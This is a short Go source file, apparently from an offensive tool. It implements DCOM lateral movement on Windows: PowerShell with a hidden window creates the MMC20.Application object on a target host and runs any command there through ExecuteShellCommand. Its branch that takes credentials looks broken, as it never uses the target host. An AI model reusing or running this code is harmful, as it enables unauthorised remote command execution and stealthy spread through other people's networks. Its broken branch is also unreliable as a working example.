//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
)

func lateralDCOM(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	ps := ""
	if user != "" && pass != "" {
		ps = fmt.Sprintf(`$c = New-Object System.Management.Automation.PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); $d = New-Object -ComObject MMC20.Application -ArgumentList $c; $d.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c %s","7")`, user, pass, cmd)
	} else {
		ps = fmt.Sprintf(`$d = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","%s")); $d.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c %s","7")`, target, cmd)
	}
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	return string(out), err
}
